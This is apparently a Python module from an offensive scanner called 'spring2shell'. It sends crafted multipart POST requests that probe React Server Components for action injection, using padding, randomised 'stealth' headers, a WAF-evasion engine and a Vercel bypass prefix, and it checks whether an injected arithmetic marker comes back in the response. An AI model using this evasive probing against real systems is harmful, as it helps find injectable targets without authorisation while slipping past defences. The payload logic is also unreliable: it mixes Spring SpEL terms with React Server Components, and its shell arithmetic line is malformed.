"""
React2Shell multipart exploitation scanner for spring2shell.

Targets React Server Components (RSC) action deserialization.
Three probe scenarios: standard, safe-check, vercel-bypass.
"""

from __future__ import annotations

import logging
import random
import urllib.parse
from typing import Any

from spring2shell.core.session import create_stealth_session
from spring2shell.evasion.headers import get_random_headers
from spring2shell.evasion.waf_engine import waf_engine
from spring2shell.utils.logging import log_event, log_swallowed_exception
from spring2shell.utils.signals import is_interrupted


def _build_react2shell_body(
    padding_kb: int = 128,
    safe_mode: bool = False,
    vercel_bypass: bool = False,
) -> tuple[str, dict[str, str], str]:
    """Build the multipart/form-data body and headers for a React2Shell probe.

    Args:
        padding_kb:     Size of the junk padding in kilobytes.
        safe_mode:      If True, sends a safe-check payload (no SpEL expression).
        vercel_bypass:  If True, prepends the "V0" Vercel decoder bypass prefix.

    Returns:
        Tuple of (body: str, headers: dict[str, str], expected_marker: str).
    """
    boundary = f"----React2Shell{random.getrandbits(48):x}"
    padding = "X" * (padding_kb * 1024)
    calc_expr = "41*271"
    expected = str(41 * 271)  # "11111"
    action_id = f"rsc-{random.randint(100000, 999999)}"

    if safe_mode:
        core = f"SAFE-CHECK::{action_id}::invalid\n{padding[:256]}"
    else:
        serialized = f"$ACTION:{action_id}:$EVAL$(({calc_expr}))"
        core = f"{serialized}\n$(( echo {calc_expr} ))"

    if vercel_bypass:
        core = padding + "V0" + core

    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="0"; filename="action"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
        f"{padding}{core}\r\n"
        f"--{boundary}--\r\n"
    )

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "next-action": action_id,
        "rsc-action-id": action_id,
        "Accept": "*/*",
    }
    return body, headers, expected


def scan_react2shell(
    target_url: str,
    padding_kb: int = 128,
) -> list[dict[str, Any]]:
    """Probe *target_url* for React Server Components action injection.

    Runs 3 scenarios:
    - ``standard``:      Full SpEL calc expression, expects math result to be reflected.
    - ``safe-check``:    Invalid action — expects RSC decoder error (no actual exec).
    - ``vercel-bypass``: Prepends Vercel V0 prefix for Vercel-hosted RSC targets.

    Args:
        target_url:  Base URL of the target.
        padding_kb:  Multipart padding size in KB.

    Returns:
        List of finding dicts for each scenario that produced a detection signal.
    """
    results: list[dict[str, Any]] = []
    session = create_stealth_session()
    base_url = urllib.parse.urljoin(target_url.rstrip("/") + "/", "")
    log_event(logging.INFO, "React2Shell probe start", target=base_url)

    scenarios = [
        {"name": "standard",      "safe": False, "vercel": False},
        {"name": "safe-check",    "safe": True,  "vercel": False},
        {"name": "vercel-bypass", "safe": False, "vercel": True},
    ]

    for scenario in scenarios:
        if is_interrupted():
            break

        body, extra_headers, expected = _build_react2shell_body(
            padding_kb=padding_kb,
            safe_mode=scenario["safe"],
            vercel_bypass=scenario["vercel"],
        )
        headers = get_random_headers()
        headers.update(extra_headers)
        body, headers = waf_engine.apply(body, headers)

        try:
            resp = session.post(base_url, data=body, headers=headers, timeout=8)
        except Exception as exc:
            log_swallowed_exception(f"React2Shell probe {scenario['name']}", exc)
            continue

        redirect_header = resp.headers.get("X-Action-Redirect", "")
        vuln_status = None
        evidence = None

        if expected in redirect_header or expected in resp.text:
            vuln_status = "confirmed"
            evidence = f"Math marker '{expected}' observed in redirect/output"
        elif scenario["safe"] and resp.status_code >= 500 and "rsc" in resp.text.lower():
            vuln_status = "unverified"
            evidence = "Safe-check triggered RSC decoder error (5xx)"
        elif resp.status_code in (200, 400) and len(resp.text) > len(body) * 0.05:
            vuln_status = "unverified"
            evidence = "Server processed multipart action payload without rejection"

        if vuln_status:
            results.append({
                "url": target_url,
                "endpoint": base_url,
                "status": vuln_status,
                "confidence": "high" if vuln_status == "confirmed" else "medium",
                "status_code": resp.status_code,
                "vulnerable": vuln_status.capitalize(),
                "evidence": evidence,
                "payload_used": scenario["name"],
                "method": "POST",
                "framework": "React2Shell",
            })
            log_event(logging.INFO, "React2Shell detection",
                      scenario=scenario["name"], status=vuln_status, evidence=evidence)

    return results
